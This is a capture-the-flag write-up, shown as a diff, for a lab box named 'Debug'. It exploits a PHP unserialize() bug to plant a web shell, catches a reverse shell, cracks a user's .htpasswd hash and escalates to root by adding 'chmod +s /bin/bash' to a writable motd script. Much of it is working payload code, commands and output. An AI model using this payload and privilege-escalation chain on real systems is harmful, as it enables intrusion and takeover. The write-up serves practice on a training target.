@@ -1,0 +1,234 @@
+Debug
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.4.81
+Host is up, received syn-ack (0.16s latency).
+Scanned at 2021-04-01 10:47:01 EDT for 15s
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
+|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs=
+|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+GOBUSTER SCANS:
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.4.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.4.81
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/04/01 10:50:49 Starting gobuster
+===============================================================
+/javascript (Status: 301)
+/backup (Status: 301)
+/grid (Status: 301)
+/less (Status: 301)
+/javascripts (Status: 301)
+
+
+in the 'backup' directory, i found 'index.html.bak' and 'index.php.bak' file 
+after reading the 'index.php.bak' file, i found a bug:
+
+=================================
+<?php
+
+class FormSubmit {
+
+public $form_file = 'message.txt';
+public $message = '';
+public function SaveMessage() {
+$NameArea = $_GET['name']; 
+$EmailArea = $_GET['email'];
+$TextArea = $_GET['comments'];
+
+	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
+
+}
+
+public function __destruct() {
+file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
+echo 'Your submission has been successfully saved!';
+}
+
+}
+// Leaving this for now... only for debug purposes... do not touch!
+$debug = $_GET['debug'] ?? '';
+$messageDebug = unserialize($debug);
+
+$application = new FormSubmit;
+$application -> SaveMessage();
+
+?>
+=================================
+
+IN THIS SNIPPET, THE USER INPUT GET UNSERIALIZED
+WE CAN USE THE PHP DESERIALIZATION EXPLOIT .........
+
+THEORY:
+
+Serialization is when an object in a programming language (say, a Java or PHP object) is converted into a format that can be stored or transferred. Whereas deserialization refers to the opposite: it’s when the serialized object is read from a file or the network and converted back into an object.
+
+Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow.
+
+In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:
+
+  1.The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.
+
+  2.All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
+
+
+I MADE A code.php FILE WHICH MAKE A SERIALIZE OBJECT FOR US:
+==============================================
+<?php
+
+class FormSubmit {
+
+public $form_file = 'message.php';
+public $message = '<?php system($_GET["cmd"]); ?>';
+ 
+}
+$application = new FormSubmit;
+//$application -> SaveMessage();
+echo serialize($application)
+
+?>
+============================================
+
+OUTPUT:
+┌──(kali㉿kali)-[~/debug]
+└─$ php code.php   
+O:10:"FormSubmit":2:{s:9:"form_file";s:11:"message.php";s:7:"message";s:30:"<?php system($_GET["cmd"]);?>";}             
+
+
+AFTER SENDING THIS REQUEST(URL-ENCODED) THROUGH BURP AND THEN CURLING THE WEBPAGE:
+┌──(kali㉿kali)-[~/debug]
+└─$ curl http://10.10.4.81/message.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+YESS!! WE HAVE CODE EXECUTION
+
+
+GOT THE REVERSE SHELL:
+┌──(kali㉿kali)-[~/debug]
+└─$ nc -nvlp 1234                            
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.4.81] 45978
+bash: cannot set terminal process group (972): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@osboxes:/var/www/html$ 
+
+RUNNING LINPEAS ON THE BOX:
+nothin interesting.........
+
+
+I FOUND THE JAMES USER HASH IN THE .htpasswd FILE:
+www-data@osboxes:/var/www/html$ cat .htpasswd 
+james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
+www-data@osboxes:/var/www/html$ 
+
+
+LETS CRACK IT:
+┌──(kali㉿kali)-[~/debug]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+[sudo] password for kali: 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jamaica          (james)
+1g 0:00:00:00 DONE (2021-04-01 13:19) 1.315g/s 884.2p/s 884.2c/s 884.2C/s evelyn..kelly
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+CHANGIN TO THE JAMES USER
+GOT THE USER FLAG
+
+i found a note for james:
+==================================================
+james@osboxes:~$ cat Note-To-James.txt 
+Dear James,
+
+As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 
+
+But there's still one thing I'd like you to do, before the submission.
+
+Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D
+
+I gave you access to modify all these files :) 
+
+Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!
+
+Best Regards,
+
+root
+james@osboxes:~$ 
+=================================================
+
+we have access modify the ssh welcome msg files
+james@osboxes:/etc/update-motd.d$ ls -la
+total 44
+drwxr-xr-x   2 root root   4096 Mar 10 18:38 .
+drwxr-xr-x 134 root root  12288 Mar 10 20:08 ..
+-rwxrwxr-x   1 root james  1220 Mar 10 18:32 00-header
+-rwxrwxr-x   1 root james     0 Mar 10 18:38 00-header.save
+-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
+-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
+-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
+-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
+-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
+-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
+james@osboxes:/etc/update-motd.d$ 
+
+THESE ARE THE FILES
+SO I EDIT THE '00-header' FILE AND WRITE:
+chmod +s /bin/bash
+
+THEN OPENING AN ANOTHER TERMINAL, SSH TO THE JAMES USER
+THEN ON THE PREVIOUS TERMINAL CHECK THE /bin/bash 
+
+fijames@osboxes:/etc/update-motd.d$ nano 00-header
+james@osboxes:/etc/update-motd.d$ ls- la /bin/bash 
+^C
+james@osboxes:/etc/update-motd.d$ ls -la /bin/bash 
+-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
+james@osboxes:/etc/update-motd.d$ /bin/bash -p
+bash-4.3# id
+uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james
+)
+bash-4.3# whoami
+root
+bash-4.3# 
+
+YES WE ARE ROOT
+GOT THE ROOT FLAG
+
+
+
+
+
+
+
+
